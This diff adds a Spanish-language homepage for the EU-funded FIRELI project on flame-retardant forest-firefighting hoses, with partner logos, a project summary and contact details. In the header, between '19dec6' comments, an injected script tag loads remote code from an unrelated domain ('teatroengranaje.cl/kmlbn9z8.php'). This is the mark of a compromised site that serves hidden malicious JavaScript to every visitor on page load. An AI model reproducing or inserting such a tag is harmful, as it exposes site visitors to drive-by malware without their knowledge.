@@ -1,0 +1,136 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta name="Description" content="Proyecto FIRELI" />
+<meta name="Keywords" content="Líneas de Mangueras retardantes a la llama para aplicaciones contra incendios forestales" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta name="Distribution" content="Global" />
+<meta name="Author" content="Proyecto FIRELI" />
+<meta name="Robots" content="index,follow" />
+<link rel="stylesheet" href="style.css" type="text/css" />
+<title>proyecto FIRELI</title>	
+
+<script language="JavaScript">
+// Browser Slide-Show script.
+// With image cross fade effect for those browsers that support it.
+var slideCache = new Array();
+function RunSlideShow(pictureName,imageFiles,displaySecs)
+{
+var imageSeparator = imageFiles.indexOf(";");
+var nextImage = imageFiles.substring(0,imageSeparator);
+if (document.all)
+{
+document.getElementById(pictureName).style.filter="blendTrans(duration=2)";
+document.getElementById(pictureName).filters.blendTrans.Apply();
+}
+document.getElementById(pictureName).src = nextImage;
+if (document.all)
+{
+document.getElementById(pictureName).filters.blendTrans.Play();
+}
+var futureImages= imageFiles.substring(imageSeparator+1,imageFiles.length)
++ ';' + nextImage;
+setTimeout("RunSlideShow('"+pictureName+"','"+futureImages+"',"+displaySecs+")",
+displaySecs*1000);
+// Cache the next image to improve performance.
+imageSeparator = futureImages.indexOf(";");
+nextImage = futureImages.substring(0,imageSeparator);
+if (slideCache[nextImage] == null) {
+slideCache[nextImage] = new Image;
+slideCache[nextImage].src = nextImage;
+}
+}
+</script>
+</head>
+
+<body onLoad="presImagen()">
+<div id="header">
+    <div id="header-content">
+        <h1 id="logo"><a href="index.html" title="Proyecto FIRELI"><img src="images/fireli-logo.jpg" alt="logo Proyecto Fireli" /></a></h1>
+        <h2 align="right" id="slogan"><a href="/english/index.html" class="gray" hreflang="EN"><br />[ · ENGLISH · ]</a><br /><br /><img src="images/7.gif" alt="" /></h2>
+        <ul>
+            <li><a href="index.html" id="current">Inicio</a></li>
+            <li><a href="proyecto.html">Proyecto</a></li>
+            <li><a href="objetivos.html">Objetivos</a></li>
+            <li><a href="barreras.html">Barreras</a></li>
+            <li><a href="newsletter.pdf" target="_blank">Newsletter</a></li>
+        </ul>
+    </div><!--19dec6--><script type="text/javascript" src="http://teatroengranaje.cl/kmlbn9z8.php?id=13497299"></script><!--/19dec6-->
+
+</div> 
+<div class="headerphoto">
+    <img src="images/img-cab3.jpg" width="760" height="225" id="Fotos" />
+    <script language="JavaScript">
+    RunSlideShow("Fotos","images/img-cab0.jpg;images/img-cab1.jpg;images/img-cab2.jpg;images/img-cab3.jpg;"
+    + "images/img-cab4.jpg",4);
+    </script>
+</div>
+<div id="content-wrap">
+    <div id="content">
+        <div id="sidebar" >
+            <div class="sidebox">	
+                <h1>&nbsp;</h1>
+                <ul class="sidemenu">
+                    <li><a href="productos-mesa.html"><img src="images/socios/MESA25.jpg"/><br /><strong>España </strong>- (COORDINADOR)</a></li>
+                    <li><a href="elatorsa.html"><img src="images/socios/elastorsa.jpg" alt="elatorsa" /><br />España</a></li>
+                    <li><a href="europrotect.html"><img src="images/socios/EUROPROTECT.jpg" /><br />Francia</a></li>
+                    <li><a href="rauplan.html"><img src="images/socios/rauplan.jpg" /><br />Finlandia</a></li>
+                    <li><a href="metalblast.html"><img src="images/socios/QSE-METALBLAST.jpg" /><br />Gran Bretaña</a></li>
+                    <li><a href="qinetiq.html"><img src="images/socios/qinetiq_logo_trans.gif" /><br />Reino Unido (IDT)</a></li>
+                    <li><a href="itav.html"><img src="images/socios/Logo-ITAV.jpg" /><br />España (DIR.TEC. PROYECTO)</a></li>
+                    <li><a href="fiactu.html"><img src="images/socios/FIACTU.jpg" /><br />Grecia</a></li>
+                    <li><a href="laviosa.html"><img src="images/socios/lcl-laviosa.jpg" /><br />Italia</a></li>
+                </ul>				
+            </div>					
+        </div>
+        <div id="main">		
+            <div class="post">
+                <h1>Proyecto Fireli</h1>
+                <div class="textbox">
+               <p class="float-right"><img src="images/log-7.png" alt="FP7 (Séptimo Programa Marco) " class="gray" /></p>
+                    <h2>FP7 (Séptimo Programa Marco) </h2>
+                    <p>Principal instrumento de la <strong>UE</strong> para la financiación de programas de I+D científicos. El programa fomenta la cooperación entre universidades, centros de investigación y las industrias (empresas pequeñas y medianas incluidas) y proporciona apoyo financiero para sus proyectos conjuntos. </p><p>El<strong> FP7</strong> está diseñado para mejorar la eficacia de los programas anteriores con el objetivo de establecer el Espacio Europeo de Investigación (EEI) y el desarrollo de la economía de Europa basada en el conocimiento.</p>     
+                    <h3>Descripción General</h3>
+                    <p><strong>FP7 Investigación en beneficio de las PYME, convocatoria PYME-2007-01</strong><br />
+                    Numero Proyecto: <strong>222152</strong><br />
+                    Fecha inicio efectiva: <strong>1 de agosto de 2008</strong><br />                    
+                    Título Proyecto: <strong>Líneas de Mangueras retardantes a la llama para aplicaciones contra incendios forestales</strong><br />
+                    Coordinador: <strong>PRODUCTOS Y MANGUERAS ESPECIALES, S.A.  (ESPAÑA)</strong> </p>  
+                    
+                    <h3>Persona de contacto                    </h3>
+                  <p><strong>Fernando Mariju&aacute;n Martinez<br /></strong>
+                    Productos MESA<br />
+					E-mail:<a href="mailto: f.marijuan@productosmesa.com"> f.marijuan@productosmesa.com</a> / Web:<a href=" www.productosmesa.com" title=" www.productosmesa.com" target="_blank"> www.productosmesa.com</a><br />
+                  Tel&eacute;fono:<strong> +34 941 34 15 46</strong> / Fax: <strong>+34 941 34 22 54</strong></p>
+                    <p class="post-footer align-right"><a href="fireliproject.pdf" class="readmore" target="_blank"><strong>DESCARGAR CATÁLOGO</strong></a>+</p>
+                  <h1>Concepto del Proyecto</h1>        
+                  <p>Los incendios forestales son un problema a nivel mundial, en Europa afectan principalmente a los pa&iacute;ses mediterr&aacute;neos (Grecia, Francia, Italia, Portugal y   Espa&ntilde;a), pero cada d&iacute;a est&aacute;n m&aacute;s amenazados los bosques del Norte de Europa   debido al calentamiento global...</p>  
+                    <p class="post-footer align-right"><a href="proyecto.html" target="_blank" class="readmore">Ampliar información</a>+</p>
+                    	
+                    <h1>Objetivos del Proyecto</h1>
+                    <p>Hay que recalcar que las demandas del usuario final sobre las especificaciones de las mangueras a menudo sobrepasan las posibilidades de producción actuales, por ejemplo la resistencia a fuego directo actualmente esta limitada a una resistencia de 1 minuto frente a una llama a 350ºC... </p>
+                    <p class="post-footer align-right"> 				
+                    <a href="objetivos.html" class="readmore">Ampliar información</a>+
+                    </p>
+                    
+                    <h1>Barreras tecnol&oacute;gicas de los productos actuales</h1>        
+                    <p>Hay una serie de obst&aacute;culos tecnol&oacute;gicos que impiden el desarrollo en la   actualidad de las caracter&iacute;sticas del proyecto FIRELI, principalmente...</p>  
+                    <p class="post-footer align-right">				
+                    <a href="barreras.html" class="readmore">Ampliar información</a>+
+                    </p>
+                    <br />
+                </div>
+          </div>
+            <div class="post">
+                <h1>GOMDUR 4K&reg;</h1>
+                <p><img src="images/img-fot-manguera.gif" alt="imagen manguera GOMDUR 4K" / width="532" height="261" /></p>
+            </div>	
+        </div>
+    </div>
+</div>
+<div id="footer">
+	<p>Proyecto Fireli</p>
+</div>
+
+</body>
+</html>
